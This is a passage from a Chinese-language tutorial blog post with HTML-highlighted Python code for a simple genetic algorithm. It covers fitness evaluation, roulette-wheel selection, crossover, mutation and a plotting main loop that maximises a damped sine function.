punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#由于是计算最大值，若存在正数则直接去除负数个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population</code></pre></blockquote><h2 id="定义选择方法"><a href="#定义选择方法" class="headerlink" title="定义选择方法"></a>定义选择方法</h2><blockquote><p>个体生存概率公式：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105143.png" alt=""></p></blockquote><blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018145013.png" class="lazyload"></p><p>根据适应度以及遗传概率，进行选择：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#定义物竞天择,弱者淘汰</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#轮盘赌选择,染色体累计概率</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#进行选择，淘汰弱者，获取新种群</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#留下优秀个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span></code></pre></blockquote><h2 id="定义交叉方法"><a href="#定义交叉方法" class="headerlink" title="定义交叉方法"></a>定义交叉方法</h2><blockquote><p>像染色体一样，也进行交叉操作，并且给与交叉操作产生的概率：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#交叉算子</span><span class="token comment" spellcheck="true">#population_new为选择下来的种群，pc为交叉概率</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="定义变异方法"><a href="#定义变异方法" class="headerlink" title="定义变异方法"></a>定义变异方法</h2><blockquote><p>即使基因突变的概率极小，但也需要定义一个基因突变方法：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#变异算子</span><span class="token comment" spellcheck="true">#offspring为交叉后的种群，pm为基因变异概率</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="开始迭代进化"><a href="#开始迭代进化" class="headerlink" title="开始迭代进化"></a>开始迭代进化</h2><blockquote><p>主函数如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#通过matplotlib库绘出函数图形</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover 交叉</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation 变异</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过平均值表示迭代进化</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最小值表示迭代进化</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最大值表示迭代进化</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><p>遗传算法实例运行效果如下：</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018180316.png" class="lazyload"></p><blockquote><p>现在对遗传算法也大概有个简单的了解啦，暂时到这儿。</p></blockquote><p>附上完整代码：<a href="https://github.com/Yof3ng/algorithm/blob/master/SGA.py" target="_blank" rel="noopener">https://github.com/Yof3ng/algorithm/blob/master/SGA.py</a></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">def</span> <span class="token function">FuncMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    xx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>    yy<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> xx<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span>        yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">return</span> max<span class="token punctuation">(</span>yy<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#根据函数原型计算表现型（y值)，即适应度</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#由于是计算最大值，若存在正数则直接去除负数个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population<span class="token comment" spellcheck="true">#解码</span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#print(population)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#将二进制转换为整型数值</span>        x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>        Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>        <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>    <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation    <span class="token comment" spellcheck="true">#return express</span>    <span class="token comment" spellcheck="true"># print(bx[0:100])</span>    <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span><span class="token comment" spellcheck="true">#初始化个体</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population<span class="token comment" spellcheck="true">#定义物竞天择,弱者淘汰</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#轮盘赌选择,染色体累计概率</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#进行选择，淘汰弱者，获取新种群</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#留下优秀个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span><span class="token comment" spellcheck="true">#交叉算子</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span 